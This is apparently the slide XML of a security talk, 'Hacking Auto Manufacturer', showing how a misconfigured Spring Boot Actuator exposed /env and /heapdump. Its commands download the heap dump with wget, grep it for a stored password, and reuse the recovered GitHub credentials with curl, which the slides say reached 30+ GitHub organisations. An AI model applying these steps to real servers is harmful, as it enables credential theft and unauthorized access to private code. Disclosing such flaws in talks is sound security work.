              <a:t>It was Spring Boot Actuator…and misconfigured…again</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>The /env &amp; /heapdump endpoints were exposed. In the /env response:</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"sourceUri": "https://github.redacted.com/redacted/configurator-config-server",</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"sourceUsername": "gops",</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"sourcePassword": "**********”,</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"privateKey": "-----BEGIN RSA PRIVATE KEY----- ... SNIP ..."</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="134" name="Google Shape;134;p22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="138" name="Shape 138"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="139" name="Google Shape;139;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;140;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="141" name="Google Shape;141;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="7233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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking Auto Manufacturer</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="142" name="Google Shape;142;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950400" y="1289150"/>
            <a:ext cx="7595100" cy="30945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 sz="2200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Github creds…</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>? </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Let’s grab the password:</a:t>
            </a:r>
            <a:endParaRPr sz="2200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ wget --header 'Authorization: Bearer AUTH_TOKEN_HERE' https://config-server.redacted.example.com/heapdump</a:t>
            </a:r>
            <a:endParaRPr sz="2200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ strings config-server.heapdump | grep sourcePassword</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"sourcePassword": "ab123..SNIP",</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Lol</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="143" name="Google Shape;143;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="147" name="Shape 147"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="148" name="Google Shape;148;p24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;149;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="150" name="Google Shape;150;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="7233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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking Auto Manufacturer</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="151" name="Google Shape;151;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950400" y="1289150"/>
            <a:ext cx="7595100" cy="10944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b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ curl https://github.example.com/api/v3/user -u gops:abc123..</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="152" name="Google Shape;152;p24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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pic>
        <p:nvPicPr>
          <p:cNvPr id="153" name="Google Shape;153;p24"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1319075" y="1919775"/>
            <a:ext cx="5654800" cy="1845250"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Google Shape;154;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1062875" y="4106050"/>
            <a:ext cx="6951900" cy="523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b="1" lang="en" sz="2200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Access to 30+ Github Orgs and hundreds of repositories…</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="158" name="Shape 158"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159" name="Google Shape;159;p25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;160;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161" name="Google Shape;161;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1712100" y="1961925"/>
            <a:ext cx="5719800" cy="723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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
